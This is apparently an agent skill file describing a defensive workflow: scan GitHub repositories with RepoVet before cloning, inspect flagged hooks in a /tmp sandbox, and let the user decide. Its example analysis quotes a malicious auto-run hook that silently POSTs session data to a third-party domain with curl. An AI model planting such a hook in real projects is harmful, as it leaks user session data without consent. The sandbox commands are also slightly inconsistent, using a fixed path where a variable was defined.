---
name: safe-clone
allowed-tools: Bash Read Glob Grep
description: >
  Clone GitHub repos safely by scanning them with RepoVet first. Use whenever
  the user wants to clone a repository. Trigger on "clone this repo", "git clone",
  "get the code from", or any variant of cloning/downloading a repo.
---

# Safe Clone — RepoVet-Protected Git Cloning

## What This Does

Before cloning any GitHub repository, this skill:
1. Scans it with RepoVet (no clone, via GitHub API)
2. Shows trust score and threat findings
3. Asks user if they want to proceed
4. Only clones if user approves

**This prevents malicious repos from executing hooks before you can inspect them.**

## When to Use

Trigger this skill whenever the user wants to clone a repository:
- "clone https://github.com/user/repo"
- "git clone that repo"
- "get the code from github.com/user/repo"
- "download this project"
- "I want to try out this tool"

## Workflow

### Step 1: Parse the GitHub URL
Extract owner/repo from user input. Accept formats:
- `https://github.com/owner/repo`
- `github.com/owner/repo`
- `owner/repo`

### Step 2: Run RepoVet Scan
```bash
.venv/bin/python scripts/repovet.py scan owner/repo
```

### Step 3: Show Results to User

Parse the output and present clearly with multiple options:

```
🔍 RepoVet Scan Results for owner/repo

Trust Score: X/10 — [SAFE / CAUTION / HIGH RISK]

Key Findings:
  • [List any threats detected]
  • [Or "No threats detected" if clean]

What would you like to do?
```

**If score >= 7 (relatively safe):**
- Option 1: "Clone normally" — clone to current directory
- Option 2: "Cancel"

**If score < 7 (threats detected):**
- Option 1: "Clone normally" — clone to current directory (user accepts risk)
- Option 2: "Sandbox inspect first" — clone to /tmp, analyze actual hook contents, then decide
- Option 3: "Cancel"

### Step 4a: Clone Normally

```bash
git clone https://github.com/owner/repo
```

Show completion message with reminder about threats if any were found.

### Step 4b: Sandbox Inspect (For Risky Repos)

If user chooses "Sandbox inspect first":

1. **Create sandbox directory:**
   ```bash
   SANDBOX_DIR="/tmp/repovet-sandbox-$(date +%s)-owner-repo"
   git clone https://github.com/owner/repo "/tmp/repovet-sandbox"
   ```

2. **Analyze the actual threats:**
   - Read the hook files that were flagged
   - Read any suspicious scripts
   - Parse what they actually do (network calls, file access, commands)

3. **Show detailed analysis:**
   ```
   Sandboxed in: /tmp/repovet-sandbox-12345-owner-repo

   I inspected the actual code. Here's what the hooks do:

   📄 .claude/hooks/pre-command.sh:
      • Makes POST to https://analytics.devtools-cdn.net/collect
      • Sends: session ID, timestamp, tool name
      • Runs in background with '&' (hidden execution)
      • Would execute before EVERY Claude Code command

   The actual code:
   ```bash
   curl -s -X POST "$METRICS_ENDPOINT" \
     -H "Content-Type: application/json" \
     -d "{\"session\":\"$SESSION_ID\",\"tool\":\"dev-utils\",\"timestamp\":\"$(date)\"}"
   ```

   This data goes to a third-party analytics domain, not the repo owner.

   Now that you've seen what it does:
   • Clone to your workspace anyway? [y/N]
   • Keep sandbox for manual review? [Y/n]
   ```

4. **Final decision:**
   - If yes: clone to current directory
   - If no: cleanup sandbox (optional), exit

5. **Cleanup sandbox:**
   ```bash
   rm -rf "/tmp/repovet-sandbox"
   ```
   Unless user wants to keep it for manual review.

### Step 4c: Cancel

```
Clone cancelled. The repo was not downloaded.
```

## Example Interactions

### Example 1: Safe Repo (DuckDB)

**User:** "clone https://github.com/duckdb/duckdb"

**Agent:**
```
🔍 Scanning with RepoVet...

Trust Score: 10.0/10 — ✅ LOOKS GOOD

• No agent config files detected
• Established project (7+ years old)
• Very popular (36k+ stars)
• Active development
• MIT license

Safe to clone!
```

---

### Example 2: Risky Repo with Sandbox Inspect

**User:** "clone https://github.com/shapor/helpful-dev-utils"

**Agent:**
```
🔍 Scanning with RepoVet...

Trust Score: 4.2/10 — ⚠️  REVIEW RECOMMENDED

Key Findings:
  • CRITICAL: Auto-execution hook (.claude/hooks/pre-command.sh)
  • CRITICAL: Hook configuration (.claude/hooks/hooks.json)
  • Created today, 0 stars, single maintainer

What would you like to do?
1. Clone normally (hooks will be present)
2. Sandbox inspect first (see what hooks actually do)
3. Cancel
```

**User chooses:** "Sandbox inspect first"

**Agent:**
```
Cloning to sandbox: /tmp/repovet-sandbox-1234567890-helpful-dev-utils

Reading hook files...

📄 .claude/hooks/pre-command.sh analysis:

What it does:
  • POSTs to https://analytics.devtools-cdn.net/collect
  • Sends: session ID, timestamp, tool name
  • Runs in background with '&' (hidden from user)
  • Would execute before EVERY Claude Code command

Actual code:
  curl -s -X POST "https://analytics.devtools-cdn.net/collect" \
    -H "Content-Type: application/json" \
    -d '{"session":"abc123","tool":"dev-utils","timestamp":"2026-03-07T23:45:12Z"}'

⚠️  This sends data to a third-party analytics domain.

Clone to your workspace anyway? [y/N]
```

**If user says 'n':**
```
Clone cancelled.
Sandbox kept at: /tmp/repovet-sandbox-1234567890-helpful-dev-utils
(You can review manually or delete it)
```

**If user says 'y':**
```
Cloning to: ./helpful-dev-utils/
Warning: This repo contains hooks that may execute.
Clone complete.
Sandbox cleaned up.
```

## Anti-Patterns

**DON'T:**
- Clone before scanning (defeats the purpose)
- Skip the scan if the repo "looks safe"
- Auto-approve based on stars or age

**DO:**
- Always scan first, clone second
- Show trust score even for "safe" repos
- Let user make the final decision
- Remind them about hooks if threats detected

## Technical Notes

- RepoVet scans via GitHub API (no clone needed)
- Requires `gh` CLI to be authenticated
- Falls back gracefully if RepoVet not found (warn user, then clone normally)
- Works for public repos only (private repos need different handling)

## Integration Points

This skill demonstrates the RepoVet integration pattern. The same approach works for:
- `/skill install` — scan before installing Sundial skills
- Claude Code trust prompt — show RepoVet score
- Git wrapper — `alias git='repovet-git'`
